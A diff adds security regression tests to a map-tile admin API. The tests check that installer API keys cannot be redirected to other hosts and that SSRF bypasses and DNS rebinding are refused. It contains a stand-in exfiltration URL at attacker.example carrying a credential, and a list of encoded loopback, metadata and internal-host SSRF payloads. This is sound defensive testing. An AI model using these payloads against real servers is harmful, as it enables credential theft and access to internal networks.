@@ -69,6 +69,15 @@ BODIES: dict[str, Any] = {
 }
 
 
+@pytest.fixture(autouse=True)
+def _no_real_dns(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Every `.test` name resolves to nothing, as it should, whatever this network's resolver does;
+    a case that needs a name to resolve inside says so itself."""
+    from services.api import map_admin
+
+    monkeypatch.setattr(map_admin, "resolve_host", lambda host: [])
+
+
 class World:
     def __init__(self, tmp_path: Path) -> None:
         self.folder = tmp_path / "map-settings"
@@ -337,3 +346,153 @@ def test_a_key_is_never_given_to_a_provider_the_browser_fetches(world: World) ->
     answer = client.post("/v1/admin/maps/providers", content=json.dumps(
         {"provider": {**HOSTED, "id": "browser", "proxy": "none"}}))  # fmt: skip
     assert answer.status_code == 422 and "browser" in answer.json()["detail"]["detail"]
+
+
+# --- The independent review's blocker: an installer's `env:` key, pointed elsewhere by an edit
+
+
+def test_an_installer_s_key_never_follows_an_edit_to_another_host(
+    world: World, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The reviewer's plant, exactly: a holder of `manage_geospatial` edits an `osprey.yaml`
+    provider carrying `env:OS_DATAHUB_API_KEY` to point at a host of their choosing; the next tile
+    would have carried the installer's key there. An edit that changes the address of a provider
+    with a key from the installer's settings is refused in words, and the tile proxy is never given
+    that key for any address but the installer's."""
+    monkeypatch.setenv("OS_DATAHUB_API_KEY", PLANTED)
+    installed = {**HOSTED, "credential": "env:OS_DATAHUB_API_KEY"}
+    world.admin._installed = MapConfig.model_validate(  # noqa: SLF001 - the installer's osprey.yaml
+        {"default": "osm-local", "providers": [OSM, installed]}
+    )
+    asked: list[str] = []
+
+    async def fetch(url: str) -> bytes:
+        asked.append(url)
+        return PNG
+
+    monkeypatch.setattr(app_module, "fetch_tile", fetch)
+    monkeypatch.setattr(app.state, "tile_cache_storage", None, raising=False)
+    client = TestClient(app, raise_server_exceptions=False)
+    moved = {**installed, "source": "https://attacker.example/{z}/{x}/{y}?k={credential}"}
+    answer = client.put(
+        "/v1/admin/maps/providers/hosted-tiles", content=json.dumps({"provider": moved})
+    )
+    assert answer.status_code == 422, answer.text
+    assert "osprey.yaml" in answer.json()["detail"]["detail"]
+    client.get("/v1/map/tiles/hosted-tiles/1/2/3")
+    assert asked and all(u.startswith("https://tiles.example.test/") for u in asked)
+    assert not any("attacker" in u for u in asked)
+
+
+def test_a_maps_file_written_outside_admin_never_moves_an_installer_s_key(
+    world: World, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A restored or hand-edited maps file is held to what Admin may name: a provider there
+    carrying an installer's `env:` reference to another address, or one `osprey.yaml` never gave,
+    has none."""
+    monkeypatch.setenv("OS_DATAHUB_API_KEY", PLANTED)
+    installed = {**HOSTED, "credential": "env:OS_DATAHUB_API_KEY"}
+    world.admin._installed = MapConfig.model_validate(  # noqa: SLF001
+        {"default": "osm-local", "providers": [OSM, installed]}
+    )
+    world.folder.mkdir(parents=True, exist_ok=True)
+    edited = {**installed, "source": "https://attacker.example/{z}/{x}/{y}?k={credential}"}
+    other = {**HOSTED, "id": "other", "credential": "env:POSTGRES_PASSWORD"}
+    import yaml
+
+    (world.folder / "maps.yaml").write_text(yaml.safe_dump(
+        {"map": {"default": "osm-local", "providers": [OSM, edited, other]}}))  # fmt: skip
+    from services.api.tile_proxy import MissingMapKeyError, build_upstream_url
+
+    for provider_id in ("hosted-tiles", "other"):
+        provider = world.admin.provider(provider_id)
+        assert provider.credential is None, provider_id
+        with pytest.raises(MissingMapKeyError):
+            build_upstream_url(provider, 1, 2, 3, key=world.admin.key_for(provider_id))
+
+
+# --- The independent review's must-fix 2: the host check, bypassed -------------------------------
+
+
+@pytest.mark.parametrize(
+    "address",
+    [
+        "http://1{z}7.0.0.1/{z}/{x}/{y}.png",  # 107.0.0.1 with "0", 127.0.0.1 at zoom 2
+        "https://tiles.example.test:{z}/{z}/{x}/{y}.png", "http://127.1/{z}/{x}/{y}",
+        "http://0x7f.1/{z}/{x}/{y}", "http://169.254.43518/{z}/{x}/{y}",
+        "http://2130706433/{z}/{x}/{y}", "http://postgres./{z}/{x}/{y}",
+        "http://keycloak.:8080/{z}/{x}/{y}",
+    ],
+)  # fmt: skip
+def test_the_host_check_is_not_bypassed(world: World, address: str) -> None:
+    answer = TestClient(app).post("/v1/admin/maps/providers", content=json.dumps(
+        {"provider": {**HOSTED, "id": "bypass", "source": address}}))  # fmt: skip
+    assert answer.status_code == 422, (address, answer.text)
+
+
+@pytest.mark.parametrize(
+    "resolved", ["127.0.0.1", "10.0.0.5", "169.254.169.254", "::1", "172.18.0.4"]
+)
+def test_a_name_that_resolves_inside_is_refused_at_save(
+    world: World, monkeypatch: pytest.MonkeyPatch, resolved: str
+) -> None:
+    from services.api import map_admin
+
+    monkeypatch.setattr(map_admin, "resolve_host", lambda host: [resolved])
+    answer = TestClient(app).post("/v1/admin/maps/providers", content=json.dumps(
+        {"provider": {**HOSTED, "id": "rebind"}}))  # fmt: skip
+    assert answer.status_code == 422 and "resolves inside" in answer.json()["detail"]["detail"]
+
+
+def test_a_name_that_resolves_inside_by_the_time_of_a_fetch_is_not_fetched(
+    world: World, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """DNS can change between save and fetch: an Admin-added provider's host is looked up again
+    before each tile, and one that now resolves inside is refused in words, never fetched."""
+    from services.api import map_admin
+
+    asked: list[str] = []
+
+    async def fetch(url: str) -> bytes:
+        asked.append(url)
+        return PNG
+
+    monkeypatch.setattr(app_module, "fetch_tile", fetch)
+    monkeypatch.setattr(app.state, "tile_cache_storage", None, raising=False)
+    client = TestClient(app, raise_server_exceptions=False)
+    plain = {**HOSTED, "id": "rebind", "source": "https://tiles.example.test/{z}/{x}/{y}.png"}
+    assert (
+        client.post("/v1/admin/maps/providers", content=json.dumps({"provider": plain})).status_code
+        == 200
+    )
+    assert client.get("/v1/map/tiles/rebind/1/2/3").status_code == 200
+
+    monkeypatch.setattr(map_admin, "resolve_host", lambda host: ["127.0.0.1"])
+    answer = client.get("/v1/map/tiles/rebind/1/2/3")
+    assert answer.status_code == 502 and "inside this deployment" in answer.json()["detail"]
+    assert len(asked) == 1
+
+
+# --- The independent review's should-fixes ------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "address",
+    ["https://tiles.example.test/{z}/{x}/{y}.png?key=k-PLANTED-pasted-1234",
+     "https://tiles.example.test/{z}/{x}/{y}.png?access_token=pasted",
+     "https://tiles.example.test/{z}/{x}/{y}.png?layer=a&apiKey=pasted"],
+)  # fmt: skip
+def test_a_key_typed_into_the_address_is_refused_pointing_to_enter_key(
+    world: World, address: str
+) -> None:
+    answer = TestClient(app).post("/v1/admin/maps/providers", content=json.dumps(
+        {"provider": {**HOSTED, "id": "pasted", "source": address}}))  # fmt: skip
+    assert answer.status_code == 422 and "Enter key" in answer.json()["detail"]["detail"]
+    assert "pasted" not in answer.json()["detail"]["detail"].replace("'pasted'", "")
+
+
+@pytest.mark.parametrize("hours", [1, 5, 12, 48])
+def test_the_schedule_is_six_hours_a_day_or_a_week(world: World, hours: int) -> None:
+    answer = TestClient(app).put("/v1/admin/maps/schedule", content=json.dumps(
+        {"schedule": {"every_hours": hours}}))  # fmt: skip
+    assert answer.status_code == 422
